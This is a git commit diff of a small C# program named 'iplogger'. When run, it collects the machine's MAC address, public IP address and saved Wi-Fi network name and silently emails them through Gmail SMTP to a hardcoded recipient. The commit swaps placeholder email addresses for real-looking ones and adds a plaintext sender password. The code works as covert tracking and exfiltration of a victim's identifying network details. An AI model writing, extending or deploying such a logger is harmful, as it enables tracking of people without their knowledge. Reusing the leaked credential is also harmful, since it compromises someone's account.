bd5453afa3214af8c04e48af38db7bf5d114b7d3
NullByte75 <66488397+NullByte75@users.noreply.github.com>
2020-07-17 10:53:59 +0200

    Update Program.cs

--- Program.cs
+++ Program.cs
@@ -1,12 +1,10 @@
 using System;
-using System.IO;
 using System.Linq;
 using System.Net;
 using System.Net.NetworkInformation;
 using System.Net.Mail;
-using System.Net.Mime;
-using System.Threading;
-using System.ComponentModel;
+using NativeWifi;
+using System.Text;
 
 namespace iplogger
 {
@@ -16,30 +14,46 @@ namespace iplogger
         {
             foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
             {
-                var mac = string.Join(":", nic.GetPhysicalAddress().GetAddressBytes().Select(b => b.ToString("X2"))); //gets mac address and writes it into a variable
-                string publicip = new WebClient().DownloadString("http://icanhazip.com"); //gets the public ip and writes it into a string
-                Console.WriteLine(mac);
-                Console.WriteLine(publicip);
-                var fromAddress = new MailAddress("from@gmail.com", $"From Logger: {publicip}"); //change from@gmail.com to the sender email (create an email and set lesssecureapps on)
-                var toAddress = new MailAddress("to@gmail.com", "To You"); //change to@example.com to the reciever email (set lesssecureapps on)
-                var fromPassword = "thepasswordofthesender"; //change senderpassword to the password of the sender
-                var smtp = new SmtpClient
+                string name = null;
+                static string GetStringForSSID(Wlan.Dot11Ssid ssid)
                 {
-                    Host = "smtp.gmail.com",
-                    Port = 587,
-                    EnableSsl = true,
-                    DeliveryMethod = SmtpDeliveryMethod.Network,
-                    UseDefaultCredentials = false,
-                    Credentials = new NetworkCredential(fromAddress.Address, fromPassword)
-                };
-                using (var message = new MailMessage(fromAddress, toAddress)
+                    return Encoding.ASCII.GetString(ssid.SSID, 0, (int)ssid.SSIDLength);
+                }
+                WlanClient client = new WlanClient();
+                foreach (WlanClient.WlanInterface wlanIface in client.Interfaces)
                 {
-                    Subject = "logs from the logger"
-                    ,
-                    Body = $"Mac Address: {mac} Ip Address: {publicip}"
-                })
-                {
-                    smtp.Send(message);
+                    foreach (Wlan.WlanProfileInfo profileInfo in wlanIface.GetProfiles())
+                    {
+                        name = profileInfo.profileName; // this is typically the network's SSID
+                        break;
+                    }
+                    Console.WriteLine(name);
+                    var mac = string.Join(":", nic.GetPhysicalAddress().GetAddressBytes().Select(b => b.ToString("X2"))); //gets mac address and writes it into a variable
+                    string publicip = new WebClient().DownloadString("http://icanhazip.com"); //gets the public ip and writes it into a string
+                    Console.WriteLine(mac);
+                    Console.WriteLine(publicip);
+                    var fromAddress = new MailAddress("yeethelooo@gmail.com", $"From Logger: {publicip}"); //change from@gmail.com to the sender email (create an email and set lesssecureapps on)
+                    var toAddress = new MailAddress("nullbyte75@gmail.com", "To Echo"); //change to@example.com to the reciever email (set lesssecureapps on)
+                    var fromPassword = "8002federico!?"; //change senderpassword to the password of the sender
+                    var smtp = new SmtpClient
+                    {
+                        Host = "smtp.gmail.com",
+                        Port = 587,
+                        EnableSsl = true,
+                        DeliveryMethod = SmtpDeliveryMethod.Network,
+                        UseDefaultCredentials = false,
+                        Credentials = new NetworkCredential(fromAddress.Address, fromPassword)
+                    };
+                    using (var message = new MailMessage(fromAddress, toAddress)
+                    {
+                        Subject = "logs from the logger"
+                        ,
+                        Body = $"Mac Address: {mac} Ip Address: {publicip} Connected wifi ssid: {name}"
+                    })
+                    {
+                        smtp.Send(message);
+                    }
+                    break;
                 }
                 break;
             }
